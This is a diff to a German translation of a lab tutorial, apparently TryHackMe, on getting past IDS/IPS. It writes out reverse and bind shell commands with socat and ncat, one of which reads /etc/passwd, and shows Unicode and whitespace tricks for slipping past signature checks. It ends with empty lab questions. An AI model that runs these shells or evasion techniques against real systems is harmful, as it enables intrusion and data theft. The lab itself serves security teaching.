@@ -158,7 +158,7 @@ Wir werden jede dieser Ansätze in eigenen Aufgaben näher betrachten. Lassen Si
 Das IDS/IPS-System könnte so konfiguriert sein, dass bestimmte Protokolle blockiert und andere erlaubt werden. Beispielsweise könnten Sie in Erwägung ziehen, UDP anstelle von TCP zu verwenden oder HTTP statt DNS zu nutzen, um einen Angriff durchzuführen oder Daten zu exfiltrieren. Sie können das Wissen, das Sie über das Ziel und die für die Zielorganisation erforderlichen Anwendungen gesammelt haben, nutzen, um Ihren Angriff zu entwerfen. Wenn beispielsweise Web-Browsing erlaubt ist, bedeutet dies in der Regel, dass geschützte Hosts mit den Ports 80 und 443 verbunden werden können, es sei denn, ein lokaler Proxy wird verwendet. In einem Fall verließ sich der Kunde für sein Geschäft auf Google-Dienste, daher nutzte der Angreifer Google-Webhosting, um seine bösartige Website zu verbergen. Leider gibt es keine universelle Lösung; es könnte zudem erforderlich sein, etwas auszuprobieren und Fehler zu machen, solange Sie nicht zu viel Lärm verursachen.
 
 Wir haben ein IPS, das DNS-Abfragen und HTTP-Anfragen blockiert, wie in der untenstehenden Abbildung dargestellt. Insbesondere wird die Richtlinie durchgesetzt, dass lokale Maschinen keine externen DNS-Server abfragen dürfen, sondern stattdessen den lokalen DNS-Server abfragen sollen; außerdem wird sichere HTTP-Kommunikation durchgesetzt. Das IPS ist relativ permissiv, was HTTPS betrifft. In diesem Fall scheint die Verwendung von HTTPS zur Tunnelung des Verkehrs ein vielversprechender Ansatz zu sein, um das IPS zu umgehen.  
-![2024-07-24-b42ec04cbb84ddd7c08f168be25c4215.png](Bilder/2024-07-24-b42ec04cbb84ddd7c08f168be25c4215.png)
+![2024-07-28-b42ec04cbb84ddd7c08f168be25c4215.png](Bilder/2024-07-28-b42ec04cbb84ddd7c08f168be25c4215.png)
 
 [Ncat](https://nmap.org/ncat) verwendet standardmäßig eine TCP-Verbindung; Sie können es jedoch auch dazu bringen, UDP zu verwenden, indem Sie die Option `-u` nutzen.
 
@@ -297,7 +297,7 @@ Evasion durch Payload-Manipulation umfasst:
 - **Obfuskation und Kodierung der Payload** (Obfuscating and encoding the payload)
 - **Verschlüsselung des Kommunikationskanals** (Encrypting the communication channel)
 - **Ändern des Shellcodes** (Modifying the shellcode)
-![2024-07-28-245004e9e2336cc06906009b969d330b.png](Bilder/2024-07-28-245004e9e2336cc06906009b969d330b.png)
+![2024-07-28-285004e9e2336cc06906009b969d330b.png](Bilder/2024-07-28-285004e9e2336cc06906009b969d330b.png)
 
 ### Obfuskation und Kodierung der Payload
 
@@ -335,7 +335,7 @@ Einige Anwendungen verarbeiten Ihre Eingaben und führen sie korrekt aus, wenn S
 2. **Ziehen Sie es in die Rezeptspalte.**
 3. **Stellen Sie sicher, dass ein Häkchen bei „Encode all chars with a prefix of `\u`“ gesetzt ist.**
 4. **Stellen Sie sicher, dass ein Häkchen bei „Uppercase hex with a padding of 4“ gesetzt ist.**  
-![2024-07-24-f330a782dc93a8b227fc93231aa1649a.png](Bilder/2024-07-24-f330a782dc93a8b227fc93231aa1649a.png)
+![2024-07-28-f330a782dc93a8b227fc93231aa1649a.png](Bilder/2024-07-28-f330a782dc93a8b227fc93231aa1649a.png)
 **Verwenden von Escaped Unicode**
 
 Wenn Sie das Format `\uXXXX` verwenden, wird `ncat -lvnp 1234 -e /bin/bash` zu `\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`. Dies ist eine drastische Umwandlung, die Ihnen helfen würde, die Erkennung zu umgehen, vorausgesetzt, das Zielsystem interpretiert es korrekt und führt es aus.
@@ -417,3 +417,68 @@ pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify
 2022/02/24 13:39:07 socat[1208] W ioctl(6, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device
 2022/02/24 13:39:07 socat[1208] N listening on AF=2 0.0.0.0:4443
 ```
+Da wir einen Listener auf dem Angreifer-System haben, haben wir auf dem Opfer-Computer den folgenden Befehl ausgeführt:
+```shell
+entester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
+```
+Zurück auf dem Angreifer-System führen wir den Befehl `cat /etc/passwd` aus:
+```shell
+pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+[...]
+2022/02/24 15:54:28 socat[7620] N starting data transfer loop with FDs [7,7] and [1,1]
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+[...]
+```
+Wenn das IDS/IPS den Datenverkehr inspiziert, werden alle Paketdaten verschlüsselt. Mit anderen Worten, das IPS wird völlig ahnungslos gegenüber dem ausgetauschten Verkehr und Befehlen wie `cat /etc/passwd` sein. Der Screenshot unten zeigt, wie die Dinge im Netzwerk erfasst mit Wireshark erscheinen. Das hervorgehobene Paket enthält `cat /etc/passwd`; jedoch ist es verschlüsselt.  
+![2024-07-28-3352df7b863f48cfaf0aee8f308e95a9.png](Bilder/2024-07-28-3352df7b863f48cfaf0aee8f308e95a9.png)
+
+Wie Sie sehen können, ist es unmöglich, die Befehle oder Daten, die ausgetauscht werden, zu verstehen. Um den Wert der zusätzlichen Verschlüsselungsschicht besser zu erkennen, vergleichen wir dies mit einer äquivalenten socat-Verbindung, die keine Verschlüsselung verwendet.
+
+1. Auf dem Angreifer-System führen wir `socat -d -d TCP-LISTEN:4443,fork STDOUT` aus.
+2. Auf dem Opfer-Computer führen wir `socat TCP:10.20.30.129:4443 EXEC:/bin/bash` aus.
+3, Zurück auf dem Angreifer-System geben wir `cat /etc/passwd` ein und drücken die Eingabetaste.
+
+Da keine Verschlüsselung verwendet wurde, zeigt das Erfassen des Datenverkehrs zwischen den beiden Systemen die Befehle und den ausgetauschten Verkehr. Im folgenden Screenshot sehen wir den von dem Angreifer gesendeten Befehl.  
+![2024-07-28-08f8e9b8cdae4878dab23cbb57dfbbe2.png](Bilder/2024-07-28-08f8e9b8cdae4878dab23cbb57dfbbe2.png)
+
+Darüber hinaus ist es eine triviale Aufgabe, dem TCP-Stream zu folgen, da er im Klartext vorliegt und alles zu erfahren, was zwischen dem Angreifer und dem Zielsystem ausgetauscht wird. Der folgende Screenshot verwendet die Option „TCP-Stream folgen“ von Wireshark.  
+![2024-07-28-40f0e2f428db90b8b57d708d77eae99c.png](Bilder/2024-07-28-40f0e2f428db90b8b57d708d77eae99c.png)
+
+### Ändere die Daten
+
+Betrachten wir den einfachen Fall, in dem du Ncat verwenden möchtest, um eine Bind-Shell zu erstellen. Der folgende Befehl `ncat -lvnp 1234 -e /bin/bash` sagt Ncat, dass es auf TCP-Port 1234 hören und die Bash-Shell daran binden soll. Wenn du Pakete mit solchen Befehlen erkennen möchtest, musst du etwas spezifisch überlegen, um das Muster zu erkennen, aber nicht zu spezifisch.
+
+- Ein Scan nach `ncat -lvnp` kann leicht umgangen werden, indem die Reihenfolge der Flags geändert wird.
+- Andererseits kann das Überprüfen des Payloads nach `ncat -` umgangen werden, indem ein zusätzlicher Leerraum hinzugefügt wird, wie `ncat  -`, was auf dem Zielsystem immer noch korrekt ausgeführt wird.
+- Wenn das IDS nach `ncat` sucht, werden einfache Änderungen am ursprünglichen Befehl die Erkennung nicht umgehen. Wir müssen je nach Zielsystem/-anwendung komplexere Ansätze in Betracht ziehen. Eine Möglichkeit wäre, einen anderen Befehl wie `nc` oder `socat` zu verwenden. Alternativ kannst du eine andere Kodierung in Betracht ziehen, wenn das Zielsystem diese korrekt verarbeiten kann.
+
+## Fragen:
+Wie lautet die Base64-Codierung für `cat /etc/passwd`?
+```
+
+```
+
+Die Base32-Codierung eines bestimmten Strings lautet NZRWC5BAFVWCAOBQHAYAU===. Wie lautet der ursprüngliche String?
+```
+
+```
+
+Mit dem oben angegebenen openssl-Befehl haben Sie ein Zertifikat erstellt, das die Endung .crt hat, und einen privaten Schlüssel, der die Endung .key hat. Was ist die erste Zeile in der Zertifikatsdatei?
+```
+
+```
+
+Was ist die letzte Zeile in der privaten Schlüsseldatei?
+```
+
+```
+
+Auf der angehängten Maschine aus der vorherigen Aufgabe, gehen Sie zu http://MACHINE_IP:8080, wo Sie Ihre Linux-Befehle eingeben können. Beachten Sie, dass keine Ausgabe zurückgegeben wird. Ein Befehl wie `ncat -lvnp 1234 -e /bin/bash` wird eine Bind-Shell erstellen, mit der Sie sich von der AttackBox aus mit `ncat MACHINE_IP 1234` verbinden können; jedoch filtert ein IPS den Befehl, den wir im Formular eingeben. Verwenden Sie eine der in dieser Aufgabe genannten Techniken, um den Befehl im Formular anzupassen, damit er korrekt ausgeführt wird. Nachdem Sie sich mit der Bind-Shell über `ncat MACHINE_IP 1234` verbunden haben, finden Sie den Benutzernamen.
+```
+
+```
+
+# Task 6 - Evasion via Route Manipulation
